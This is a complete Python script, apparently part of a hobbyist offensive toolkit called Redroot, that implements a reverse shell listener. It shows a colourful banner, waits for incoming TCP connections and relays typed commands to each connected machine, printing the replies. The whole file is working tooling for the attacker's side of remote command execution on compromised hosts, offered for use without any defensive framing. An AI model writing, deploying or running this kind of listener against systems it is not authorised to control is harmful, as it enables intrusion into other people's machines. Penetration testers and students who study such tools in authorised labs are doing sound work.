# Copyright 2025 Agampreet Singh
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#!/usr/bin/env python3
import socket
import threading
import argparse
import time
import os
from rich.console import Console
from rich.text import Text

console = Console()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_typing_banner():
    clear()
    message = "Welcome Mr. Agampreet"
    colors = ["red", "gold1"]
    styled_text = Text()
    for i, char in enumerate(message):
        color = colors[i % 2]
        styled_text.append(char, style=f"bold {color}")
        console.print(styled_text, end="\r", soft_wrap=True)
        time.sleep(0.03)
    console.print()  # newline
    time.sleep(0.2)

def handle_client(client_socket, address):
    console.print(f"[bold green][+] Connection received from[/bold green] {address[0]}:{address[1]}")
    try:
        while True:
            cmd = console.input("[bold cyan]Shell> [/bold cyan]")
            if cmd.strip() == "":
                continue
            client_socket.send(cmd.encode() + b'\n')

            data = b""
            while True:
                chunk = client_socket.recv(4096)
                data += chunk
                if len(chunk) < 4096:
                    break

            if data:
                console.print(data.decode(errors='ignore'), end='')
            else:
                break
    except Exception:
        console.print(f"[bold red][!] Connection with {address[0]} closed.[/bold red]")
    finally:
        client_socket.close()

def start_listener(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    console.print(f"[bold yellow][*] Listening on {host}:{port} ...[/bold yellow]")
    try:
        while True:
            client_socket, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            thread.start()
    except KeyboardInterrupt:
        console.print("\n[bold red][!] User interrupted. Exiting...[/bold red]")
        server.close()
        exit(0)

if __name__ == "__main__":
    animate_typing_banner()

    parser = argparse.ArgumentParser(description="Redroot Reverse shell listener")
    parser.add_argument('--host', default='0.0.0.0', help='IP to bind (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, required=True, help='Port to listen on')
    args = parser.parse_args()
    start_listener(args.host, args.port)
